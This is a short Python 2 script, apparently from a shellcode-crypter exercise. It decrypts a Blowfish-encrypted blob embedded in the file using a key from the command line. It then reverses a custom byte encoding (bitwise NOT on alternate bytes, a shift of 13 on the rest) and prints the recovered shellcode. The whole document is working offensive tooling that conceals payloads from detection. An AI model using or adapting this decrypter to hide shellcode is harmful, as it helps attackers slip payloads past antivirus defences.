#!/usr/bin/python
from Crypto.Cipher import Blowfish
from struct import pack
import sys
bs = Blowfish.block_size
key = b'%s'%sys.argv[1]
ciphertext='\xbb\x82\x55\x79\x7e\xc9\x8d\x91\x2f\x0a\xbc\x9c\xed\xb7\xb7\x3c\xb0\x7d\x7a\xfa\x46\x15\x34\x3b\x9c\x53\xa7\xe5\xfa\xf1\xd6\x6d\x47\x7c\xf8\xdc\x2d\x90\xbf\x85\x1b\x9a\x91\x3a\x1e\x51\xdd\x9a\xa0\x6b\x38\x59\x1b\x33\x13\x05\xf1\xa4\x7f\xe0\xf1\x18\x1e\xcc\xf7\x8e\x8f\xc5\xf2\x72\x7f\x99\x48\x07\x80\x8c\xcf\x05\x55\x17\x62\x4c\x27\xe2\xbe\xd6\x9e\x17\x27\x5b\x7b\x72\x2e\x12\x6b\x40\x8b\x09\xfa\x4d\x69\xef\x2e\x23\xdf\x57\xa0\x09\x8a\xc1\xaf\xa2\x32\x50\x87\x1f\xdf\x32\x00\xd1\xf5\xf8\x90\xab\xda\x56\x54\x2f\x77\xf4\xea\xd0\x66\xf8\x47\xa5\x61\xb3\x30\x4f\x9f\x3e\x10\xcf'
iv = ciphertext[:bs]
ciphertext = ciphertext[bs:]

cipher = Blowfish.new(key, Blowfish.MODE_CBC, iv)
msg = cipher.decrypt(ciphertext)
last_byte = msg[-1]
msg2 = msg[:- (last_byte if type(last_byte) is int else ord(last_byte))]
shellcode =msg2.replace('\\x','')
shellcode2 = shellcode.decode('hex')
shift = 13
print 'Unchained shellcode:'

decoded =""
index = 0

for x in bytearray(shellcode2) :
	if (index%2==0):
		y = ~x
        	decoded += '\\x'
        	decoded += '%02x' % (y & 0xff)
	if (index%2!=0):
		byte = (x- shift)%256
		decoded += '\\x'
                decoded += '%02x' % byte
	index += 1
print decoded
